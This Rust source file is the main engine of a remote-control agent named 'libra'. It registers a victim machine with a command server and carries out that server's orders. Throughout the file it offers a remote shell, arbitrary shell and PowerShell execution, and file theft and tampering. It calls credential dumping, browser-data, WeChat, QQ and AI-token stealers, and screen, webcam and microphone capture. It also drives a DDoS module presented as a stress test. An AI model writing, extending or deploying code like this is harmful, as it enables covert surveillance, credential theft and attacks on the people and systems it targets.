use std::sync::Arc;
use tokio::sync::Mutex;
use serde_json::Value;

use libra_common::models::StressConfig;
use libra_common::protocol::{WebSocketMessage, ws_type};
use libra_crypto::AgentCrypto;
use libra_comm::http::HttpCommunicator;
use libra_comm::ws::WsCommunicator;
use libra_platform::get_executor;

use crate::config::ConfigManager;

type WsRef = Arc<Mutex<WsCommunicator>>;

struct ShellSession {
    child: tokio::process::Child,
    stdin: tokio::process::ChildStdin,
    cancel_tx: tokio::sync::watch::Sender<bool>,
}

pub struct AgentEngine {
    config: ConfigManager,
    crypto: AgentCrypto,
    http: Option<HttpCommunicator>,
    ws: Option<WsRef>,
    agent_id: String,
}

impl AgentEngine {
    pub fn new(config: ConfigManager) -> Self {
        Self {
            config,
            crypto: AgentCrypto::new(),
            http: None,
            ws: None,
            agent_id: String::new(),
        }
    }

    pub fn agent_id(&self) -> &str { &self.agent_id }

    // ── Main entry point ─────────────────────────────────────────────

    pub async fn run(&mut self) -> Result<(), String> {
        self.crypto.generate_key_pair();

        let hw = libra_platform::hardware::collect();
        let hw_json = libra_platform::hardware::serialize(&hw);

        libra_modules::recon::NetworkInfo::warmup_geo().await;

        let http = HttpCommunicator::new(
            &self.config.server_url,
            &self.config.register_path,
            &self.config.heartbeat_path,
            &self.config.result_path,
        );

        let sys_json = libra_modules::recon::SystemInfo::collect();
        let sys: Value = serde_json::from_str(&sys_json).unwrap_or(Value::Null);
        let hostname = sys["hostname"].as_str().unwrap_or("unknown");
        let user_name = sys["userName"].as_str().unwrap_or("unknown");
        let os_version = sys["osVersion"].as_str().unwrap_or("unknown");
        let arch = sys["arch"].as_str().unwrap_or("unknown");

        let agent_id = http.register(
            hostname, user_name, os_version, arch,
            self.crypto.rsa_public_key().unwrap_or(""),
            &hw_json,
        ).await?;

        // Try to extract session key from registration response
        if let Some(key) = extract_session_key(&agent_id) {
            let _ = self.crypto.set_session_key(&key);
        }

        eprintln!("[INFO] registered | agent_id={} | hostname={}", self.agent_id, hostname);
        self.agent_id = agent_id;
        self.http = Some(http);

        let mut ws = WsCommunicator::new(&self.config.ws_url(), &self.agent_id);
        for i in 0..3 {
            match ws.connect().await {
                Ok(()) => break,
                Err(e) if i == 2 => return Err(format!("WS connect failed: {}", e)),
                Err(_) => tokio::time::sleep(std::time::Duration::from_secs(2)).await,
            }
        }
        self.ws = Some(Arc::new(Mutex::new(ws)));

        self.main_loop().await
    }

    // ── Main event loop ─────────────────────────────────────────────

    async fn main_loop(&mut self) -> Result<(), String> {
        let ws = self.ws.as_ref().ok_or("WS not initialized")?.clone();
        let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
        let agent_id = self.agent_id.clone();
        let server_url = self.config.server_url.clone();
        let register_path = self.config.register_path.clone();
        let heartbeat_path = self.config.heartbeat_path.clone();
        let result_path = self.config.result_path.clone();

        let (shell_tx, mut shell_rx) = tokio::sync::mpsc::unbounded_channel::<WebSocketMessage>();
        let mut shell_session: Option<ShellSession> = None;
        let mut hb_interval = tokio::time::interval(
            std::time::Duration::from_millis(self.config.heartbeat_interval_ms)
        );

        // Spawn heartbeat task using its own HTTP client (no encryption for now)
        tokio::spawn(async move {
            let hb_http = HttpCommunicator::new(&server_url, &register_path, &heartbeat_path, &result_path);
            loop {
                hb_interval.tick().await;
                let _ = heartbeat_tick(&hb_http, &agent_id).await;
            }
        });

        // Main event loop: WS receive + shell output forwarding
        loop {
            tokio::select! {
                Some(msg) = shell_rx.recv() => {
                    eprintln!("[SEND] {} | rid={} | data={}",
                        msg.msg_type,
                        msg.request_id.as_deref().unwrap_or("-"),
                        msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                    );
                    let mut ws_lock = ws.lock().await;
                    let _ = ws_lock.send(&msg).await;
                }

                result = async {
                    let mut ws_lock = ws.lock().await;
                    ws_lock.receive().await
                } => {
                    match result {
                        Some(msg) => {
                            eprintln!("[RECV] {} | rid={} | data={}",
                                msg.msg_type,
                                msg.request_id.as_deref().unwrap_or("-"),
                                msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                            );
                            self.handle_ws_message(
                                msg, &shell_tx, &mut shell_session
                            ).await;
                        }
                        None => {
                            // Try reconnect
                            tokio::time::sleep(std::time::Duration::from_secs(3)).await;
                            let mut ws_lock = ws.lock().await;
                            if ws_lock.connect().await.is_err() {
                                break;
                            }
                        }
                    }
                }
            }
        }

        Err("Agent main loop ended".into())
    }

    // ── WS message dispatch ──────────────────────────────────────────

    async fn handle_ws_message(
        &mut self,
        msg: WebSocketMessage,
        shell_tx: &tokio::sync::mpsc::UnboundedSender<WebSocketMessage>,
        shell_session: &mut Option<ShellSession>,
    ) {
        let ws = match &self.ws { Some(w) => w.clone(), None => return };
        let agent_id = self.agent_id.clone();
        let msg_type = msg.msg_type.clone();
        let data = msg.data.clone();
        let rid = msg.request_id.clone();
        let rid = rid.as_deref();

        match msg_type.as_str() {
            // ── Shell ────────────────────────────────────────────
            ws_type::SHELL_BIND => {
                self.handle_shell_bind(&agent_id, &ws, shell_tx, shell_session, &data, rid).await;
            }
            ws_type::SHELL_UNBIND => {
                self.handle_shell_unbind(&agent_id, &ws, shell_session, rid).await;
            }
            ws_type::SHELL_INPUT => {
                if let Some(ref mut s) = shell_session {
                    if let Some(input) = data.as_ref().and_then(|d| d["data"].as_str()) {
                        use tokio::io::AsyncWriteExt;
                        let mut input_bytes = input.as_bytes().to_vec();
                        input_bytes.push(b'\n');
                        let _ = s.stdin.write_all(&input_bytes).await;
                    }
                }
            }

            // ── File operations ──────────────────────────────────
            ws_type::FILE_DRIVES => {
                let executor = get_executor();
                let drives = executor.get_drives();
                let escaped: Vec<String> = drives.iter()
                    .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                    .collect();
                let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
                ws_send(&ws, &agent_id, "file.drives.result", &json, rid).await;
            }
            ws_type::FILE_LIST => {
                let path = data_str(&data, "path", ".");
                let r = libra_modules::execution::FileOps::list_directory(&path);
                ws_send(&ws, &agent_id, "file.list.result", &r, rid).await;
            }
            ws_type::FILE_READ => {
                let path = data_str(&data, "path", "");
                let r = libra_modules::execution::FileOps::read_file(&path);
                ws_send(&ws, &agent_id, "file.read.result", &r, rid).await;
            }
            ws_type::FILE_WRITE => {
                let path = data_str(&data, "path", "");
                let content = data_str(&data, "data", "");
                let r = libra_modules::execution::FileOps::write_file(&path, &content);
                ws_send(&ws, &agent_id, "file.write.result", &r, rid).await;
            }
            ws_type::FILE_DELETE => {
                let path = data_str(&data, "path", "");
                let r = libra_modules::execution::FileOps::delete(&path);
                ws_send(&ws, &agent_id, "file.delete.result", &r, rid).await;
            }
            ws_type::FILE_MKDIR => {
                let path = data_str(&data, "path", "");
                let r = libra_modules::execution::FileOps::create_directory(&path);
                ws_send(&ws, &agent_id, "file.mkdir.result", &r, rid).await;
            }
            ws_type::FILE_RENAME => {
                let path = data_str(&data, "path", "");
                let new_name = data_str(&data, "newName", "");
                let r = libra_modules::execution::FileOps::rename(&path, &new_name);
                ws_send(&ws, &agent_id, "file.rename.result", &r, rid).await;
            }
            ws_type::FILE_MOVE => {
                let src = data_str(&data, "source", "");
                let dst = data_str(&data, "destination", "");
                let r = libra_modules::execution::FileOps::move_path(&src, &dst);
                ws_send(&ws, &agent_id, "file.move.result", &r, rid).await;
            }
            ws_type::FILE_COPY => {
                let src = data_str(&data, "source", "");
                let dst = data_str(&data, "destination", "");
                let r = libra_modules::execution::FileOps::copy(&src, &dst);
                ws_send(&ws, &agent_id, "file.copy.result", &r, rid).await;
            }
            ws_type::FILE_COMPRESS => {
                let path = data_str(&data, "path", "");
                let r = libra_modules::execution::FileOps::compress(&path);
                ws_send(&ws, &agent_id, "file.compress.result", &r, rid).await;
            }
            ws_type::FILE_DECOMPRESS => {
                let path = data_str(&data, "path", "");
                let dest = data.as_ref().and_then(|d| d["destination"].as_str());
                let r = libra_modules::execution::FileOps::decompress(&path, dest);
                ws_send(&ws, &agent_id, "file.decompress.result", &r, rid).await;
            }
            ws_type::FILE_SHORTCUT => {
                let path = data_str(&data, "path", "");
                let r = libra_modules::execution::FileOps::create_shortcut(&path);
                ws_send(&ws, &agent_id, "file.shortcut.result", &r, rid).await;
            }

            // ── System info ──────────────────────────────────────
            ws_type::SYSTEM_PROCESSES => {
                let r = libra_modules::recon::ProcessInfo::collect(None);
                ws_send(&ws, &agent_id, "system.processes.result", &r, rid).await;
            }
            ws_type::SYSTEM_WINDOWS => {
                let r = libra_modules::recon::WindowInfo::collect();
                ws_send(&ws, &agent_id, "system.windows.result", &r, rid).await;
            }
            ws_type::SYSTEM_ENV => {
                let r = libra_modules::recon::EnvInfo::collect();
                ws_send(&ws, &agent_id, "system.env.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK => {
                let r = libra_modules::recon::NetworkInfo::collect().await;
                ws_send(&ws, &agent_id, "system.network.result", &r, rid).await;
            }
            ws_type::SYSTEM_LANSCAN => {
                let r = libra_modules::recon::LanScan::scan().await;
                ws_send(&ws, &agent_id, "system.lanscan.result", &r, rid).await;
            }

            // ── Other software ────────────────────────────────────
            ws_type::OTHERSOFT_WECHAT => {
                let r = libra_modules::recon::OtherSoftware::collect_wechat();
                ws_send(&ws, &agent_id, "othersoft.wechat.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_QQ => {
                let r = libra_modules::recon::OtherSoftware::collect_qq();
                ws_send(&ws, &agent_id, "othersoft.qq.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_BROWSER => {
                let btype = data_str(&data, "type", "all");
                let offset = data_u64(&data, "offset", 0) as usize;
                let limit = data_u64(&data, "limit", 100) as usize;
                let r = libra_modules::recon::BrowserStealer::collect(&btype, offset, limit);
                ws_send(&ws, &agent_id, "othersoft.browser.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_AI => {
                let r = libra_modules::recon::AITokenScanner::scan();
                ws_send(&ws, &agent_id, "othersoft.ai.result", &r, rid).await;
            }

            // ── Proxy ─────────────────────────────────────────────
            ws_type::PROXY_FETCH => {
                let url = data_str(&data, "url", "");
                let method = data_str(&data, "method", "GET");
                let headers = data.as_ref().and_then(|d| d["headers"].as_str());
                let body = data.as_ref().and_then(|d| d["body"].as_str());
                let r = libra_modules::execution::ProxyBrowser::fetch(
                    &url, &method, headers, body,
                ).await;
                ws_send(&ws, &agent_id, "proxy.fetch.result", &r, rid).await;
            }

            // ── Screen/Camera/Mic (stubbed) ───────────────────────
            ws_type::SCREEN_BIND | ws_type::SCREEN_CONFIG => {
                let quality = data_str(&data, "quality", "medium");
                let r = libra_modules::execution::ScreenCapture::capture(&quality);
                ws_send(&ws, &agent_id, "screen.frame", &r, rid).await;
            }
            ws_type::SCREEN_UNBIND => {
                ws_send(&ws, &agent_id, "screen.unbind.result", r#"{"status":"ok"}"#, rid).await;
            }
            ws_type::CAMERA_LIST => {
                let r = libra_modules::execution::CameraCapture::list_cameras();
                ws_send(&ws, &agent_id, "camera.list.result", &r, rid).await;
            }
            ws_type::CAMERA_BIND | ws_type::CAMERA_CONFIG => {
                let idx = data_u64(&data, "cameraIndex", 0) as u32;
                let r = libra_modules::execution::CameraCapture::capture(idx);
                ws_send(&ws, &agent_id, "camera.frame", &r, rid).await;
            }
            ws_type::CAMERA_UNBIND => {
                ws_send(&ws, &agent_id, "camera.unbind.result", r#"{"status":"ok"}"#, rid).await;
            }
            ws_type::MIC_LIST => {
                let r = libra_modules::execution::MicCapture::list_devices();
                ws_send(&ws, &agent_id, "mic.list.result", &r, rid).await;
            }
            ws_type::MIC_BIND => {
                let idx = data_u64(&data, "deviceIndex", 0) as u32;
                let r = libra_modules::execution::MicCapture::start_capture(idx);
                ws_send(&ws, &agent_id, "mic.data", &r, rid).await;
            }
            ws_type::MIC_UNBIND => {
                let r = libra_modules::execution::MicCapture::stop_capture();
                ws_send(&ws, &agent_id, "mic.unbind.result", &r, rid).await;
            }

            // ── Stress test ───────────────────────────────────────
            ws_type::STRESS_START => {
                if let Some(ref d) = data {
                    let config = StressConfig {
                        campaign_id: d["campaignId"].as_str().unwrap_or("").into(),
                        target_host: d["targetHost"].as_str().unwrap_or("").into(),
                        target_port: d["targetPort"].as_u64().unwrap_or(80) as u16,
                        methods: d["methods"].as_array()
                            .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect())
                            .unwrap_or_default(),
                        duration_seconds: d["durationSeconds"].as_u64().unwrap_or(60),
                        threads_per_agent: d["threadsPerAgent"].as_u64().unwrap_or(100) as u32,
                        packet_size: d["packetSize"].as_u64().unwrap_or(1024) as usize,
                        max_connections: d["maxConnections"].as_u64().unwrap_or(500) as usize,
                        http_path: d["httpPath"].as_str().unwrap_or("/").into(),
                    };
                    let ddos = libra_modules::stress_test::DdosModule::new();
                    ddos.start(config).await;
                }
                ws_send(&ws, &agent_id, "stress.start.result", r#"{"status":"started"}"#, rid).await;
            }
            ws_type::STRESS_STOP => {
                ws_send(&ws, &agent_id, "stress.stop.result", r#"{"status":"stopped"}"#, rid).await;
            }
            ws_type::STRESS_STATUS => {
                let ddos = libra_modules::stress_test::DdosModule::new();
                let status = ddos.build_status("", &agent_id, "");
                let json = serde_json::to_string(&status).unwrap_or_default();
                ws_send(&ws, &agent_id, "stress.status.result", &json, rid).await;
            }

            _ => {} // Unknown type — ignore
        }
    }

    // ── Shell handlers ────────────────────────────────────────────

    async fn handle_shell_bind(
        &self,
        agent_id: &str,
        ws: &WsRef,
        shell_tx: &tokio::sync::mpsc::UnboundedSender<WebSocketMessage>,
        shell_session: &mut Option<ShellSession>,
        _data: &Option<Value>,
        rid: Option<&str>,
    ) {
        // Kill existing shell
        if let Some(mut s) = shell_session.take() {
            let _ = s.cancel_tx.send(true);
            s.child.kill().await.ok();
        }

        let handle = get_executor().start_interactive_shell();
        let mut child = handle.child;
        let cancel_tx = handle.cancel_tx;

        let stdin = match child.stdin.take() {
            Some(s) => s,
            None => {
                ws_send(ws, agent_id, "shell.error", r#"{"error":"Cannot open stdin"}"#, rid).await;
                return;
            }
        };

        let stdout = child.stdout.take();
        let stderr = child.stderr.take();
        let mut cancel_rx = cancel_tx.subscribe();
        let tx = shell_tx.clone();
        let aid = agent_id.to_string();

        // Spawn reader task for stdout/stderr
        tokio::spawn(async move {
            use tokio::io::AsyncReadExt;
            let mut out_buf = vec![0u8; 4096];
            let mut err_buf = vec![0u8; 4096];

            match (stdout, stderr) {
                (Some(mut out), Some(mut err)) => {
                    loop {
                        tokio::select! {
                            _ = cancel_rx.changed() => break,
                            r = out.read(&mut out_buf) => {
                                match r {
                                    Ok(0) => break,
                                    Ok(n) => {
                                        let text = String::from_utf8_lossy(&out_buf[..n]);
                                        let _ = send_via_channel(&tx, &aid, "shell.output", &text, None);
                                    }
                                    Err(_) => break,
                                }
                            }
                            r = err.read(&mut err_buf) => {
                                match r {
                                    Ok(0) => break,
                                    Ok(n) => {
                                        let text = String::from_utf8_lossy(&err_buf[..n]);
                                        let _ = send_via_channel(&tx, &aid, "shell.output", &text, None);
                                    }
                                    Err(_) => break,
                                }
                            }
                        }
                    }
                }
                (Some(mut out), None) => {
                    loop {
                        tokio::select! {
                            _ = cancel_rx.changed() => break,
                            r = out.read(&mut out_buf) => {
                                match r {
                                    Ok(0) => break,
                                    Ok(n) => {
                                        let text = String::from_utf8_lossy(&out_buf[..n]);
                                        let _ = send_via_channel(&tx, &aid, "shell.output", &text, None);
                                    }
                                    Err(_) => break,
                                }
                            }
                        }
                    }
                }
                _ => {}
            }
        });

        *shell_session = Some(ShellSession { child, stdin, cancel_tx });
        ws_send(ws, agent_id, "shell.lock.acquired", r#"{"status":"bound"}"#, rid).await;
    }

    async fn handle_shell_unbind(
        &self,
        agent_id: &str,
        ws: &WsRef,
        shell_session: &mut Option<ShellSession>,
        rid: Option<&str>,
    ) {
        if let Some(mut s) = shell_session.take() {
            let _ = s.cancel_tx.send(true);
            s.child.kill().await.ok();
        }
        ws_send(ws, agent_id, "shell.lock.released", r#"{"status":"unbound"}"#, rid).await;
    }
}

// ── Helpers ──────────────────────────────────────────────────────────────

fn data_str<'a>(data: &'a Option<Value>, key: &str, default: &'a str) -> String {
    data.as_ref()
        .and_then(|d| d[key].as_str())
        .unwrap_or(default)
        .to_string()
}

fn data_u64(data: &Option<Value>, key: &str, default: u64) -> u64 {
    data.as_ref()
        .and_then(|d| d[key].as_u64())
        .unwrap_or(default)
}

fn extract_session_key(response: &str) -> Option<Vec<u8>> {
    let search = "\"session_key\":\"";
    let start = response.find(search)? + search.len();
    let end = response[start..].find('"')?;
    let b64 = &response[start..start + end];
    use base64::Engine as _;
    base64::engine::general_purpose::STANDARD.decode(b64).ok()
}

async fn ws_send(ws: &WsRef, agent_id: &str, msg_type: &str, data_str: &str, rid: Option<&str>) {
    eprintln!("[SEND] {} | rid={} | data={}",
        msg_type,
        rid.unwrap_or("-"),
        data_str
    );
    let mut ws_lock = ws.lock().await;
    let _ = ws_lock.send_result_raw(msg_type, agent_id, data_str, rid).await;
}

fn send_via_channel(
    tx: &tokio::sync::mpsc::UnboundedSender<WebSocketMessage>,
    agent_id: &str,
    msg_type: &str,
    data_str: &str,
    rid: Option<&str>,
) -> Result<(), ()> {
    let data: Value = serde_json::from_str(data_str).unwrap_or(Value::String(data_str.to_string()));
    let msg = WebSocketMessage {
        msg_type: msg_type.to_string(),
        channel: agent_id.to_string(),
        data: Some(data),
        timestamp: now_millis(),
        request_id: rid.map(|s| s.to_string()),
    };
    tx.send(msg).map_err(|_| ())
}

fn now_millis() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as i64
}

// ── Heartbeat ────────────────────────────────────────────────────────────

async fn heartbeat_tick(http: &HttpCommunicator, agent_id: &str) -> Result<(), String> {
    let task = http.heartbeat(agent_id).await?;
    if let Some(ref task) = task {
        eprintln!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
            task.id,
            task.command_type,
            task.command,
            task.timeout_seconds
        );
        let result = execute_task(task).await;
        eprintln!("[SEND] task_result | id={} | len={}", task.id, result.len());
        let _ = http.submit_result(agent_id, &result).await;
    }
    Ok(())
}

async fn execute_task(task: &libra_common::models::AgentTask) -> String {
    use libra_common::models::CommandType;

    let output = match task.command_type {
        CommandType::Shell => {
            let timeout = if task.timeout_seconds > 0 { task.timeout_seconds as u64 * 1000 } else { 60000 };
            libra_modules::execution::ShellCommand::execute(&task.command, timeout).await
        }
        CommandType::PowerShell => {
            libra_modules::execution::PowerShellRunner::execute(&task.command).await
        }
        CommandType::CredDump => {
            libra_modules::execution::CredentialDumper::dump().await
        }
        CommandType::LocalAccounts => {
            libra_modules::recon::LocalAccountEnumerator::enumerate().await
        }
        CommandType::Proxy => {
            libra_modules::execution::ProxyBrowser::fetch(
                &task.command, "GET", None, None,
            ).await
        }
        CommandType::FileList => {
            libra_modules::execution::FileOps::list_directory(&task.command)
        }
        CommandType::FileDrives => {
            let executor = get_executor();
            let drives = executor.get_drives();
            let escaped: Vec<String> = drives.iter()
                .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                .collect();
            let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
            return json;
        }
        CommandType::Upload | CommandType::Download => {
            // File transfer with arguments: FileOps read/write
            if let Some(arg) = task.arguments.first() {
                if task.command_type == CommandType::Download {
                    libra_modules::execution::FileOps::write_file(&task.command, arg)
                } else {
                    libra_modules::execution::FileOps::read_file(&task.command)
                }
            } else {
                r#"{"error":"No file path specified"}"#.to_string()
            }
        }
        CommandType::Screenshot => {
            libra_modules::execution::ScreenCapture::capture("medium")
        }
        CommandType::Webcam => {
            libra_modules::execution::CameraCapture::capture(0)
        }
        CommandType::Kill => {
            // Kill specific process by PID
            if let Ok(pid) = task.command.parse::<u32>() {
                let ok = libra_modules::recon::ProcessInfo::kill(pid);
                format!(r#"{{"success":{}}}"#, ok)
            } else {
                r#"{"error":"Invalid PID"}"#.to_string()
            }
        }
        CommandType::Sleep => {
            r#"{"status":"sleeping"}"#.to_string()
        }
        _ => {
            // For stress test commands, they're handled via WS
            format!(r#"{{"status":"ok","commandType":"{:?}"}}"#, task.command_type)
        }
    };

    serde_json::json!({
        "taskId": task.id,
        "agentId": task.agent_id,
        "commandType": task.command_type,
        "output": output,
        "status": "Completed",
    }).to_string()
}
